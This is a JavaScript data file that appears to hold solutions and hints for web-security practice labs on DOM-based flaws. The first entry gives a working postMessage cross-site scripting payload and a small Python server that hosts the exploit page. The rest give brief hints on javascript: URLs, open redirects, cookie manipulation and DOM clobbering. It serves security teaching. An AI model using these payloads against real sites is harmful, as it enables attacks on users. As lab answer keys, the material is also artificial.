export default {
  'dom-lab-dom-xss-using-web-messages': {
    note: 'The page writes `event.data` into `innerHTML` without checking the origin; frame it and post an image payload.',
    work: {
      hints: [
        'The page listens for `message` events and writes the data into a sink. Check whether it validates `event.origin`.',
        'It does not. You can frame the page and call `postMessage` from your own origin.',
        'Frame `/` and post `<img src=1 onerror=print()>`; the handler writes the string into `innerHTML`.'
      ],
      approach:
        'A missing origin check on `postMessage`. The browser delivers messages from any window that has a reference to the target, so the attacker frames the page and sends an HTML payload. `innerHTML` executes the error handler even though a `<script>` tag would not.',
      request: `# attacker page
<iframe src="https://LAB-ID/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>`,
      tokens: [
        ['<iframe>', 'Loads the vulnerable page so the attacker has a window reference.'],
        ['onload', 'Fires after the frame document is ready; posting earlier can be lost.'],
        ['contentWindow', 'The target window object; `postMessage` requires a reference, not an origin.'],
        ['postMessage(data, "*")', 'Delivers the string to any origin. The receiver should verify `event.origin`.'],
        ['<img onerror>', 'The payload that the receiver writes to `innerHTML`; a script tag would not execute there.']
      ],
      script: `import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

host = sys.argv[1]
page = f'''<iframe src="https://{host}/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>'''

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(page.encode())

HTTPServer(("0.0.0.0", 8000), H).serve_forever()`
    }
  },
  'dom-lab-dom-xss-using-web-messages-and-a-javascript-url': {
    note: 'The message handler assigns `data` to `location.href`; send a `javascript:` URL instead of HTML.'
  },
  'dom-lab-dom-xss-using-web-messages-and-json-parse': {
    note: 'The handler parses JSON then assigns a field to an iframe `src`; send a valid object whose URL uses `javascript:`.'
  },
  'dom-lab-dom-open-redirection': {
    note: 'A `next`/`url` parameter flows into `location.href`; point it at an external site or a `javascript:` URL.'
  },
  'dom-lab-dom-cookie-manipulation': {
    note: 'A URL parameter is written into `document.cookie`, and the cookie value is later reflected into the DOM.'
  },
  'dom-lab-dom-xss-exploiting-dom-clobbering': {
    note: 'An injected `id`/`name` shadows a global object the script trusts, redirecting a sink to attacker-controlled data.'
  },
  'dom-lab-dom-clobbering-attributes-to-bypass-html-filters': {
    note: 'Clobber a form attribute so the filter\'s check and the sink\'s read resolve to different elements.'
  }
}
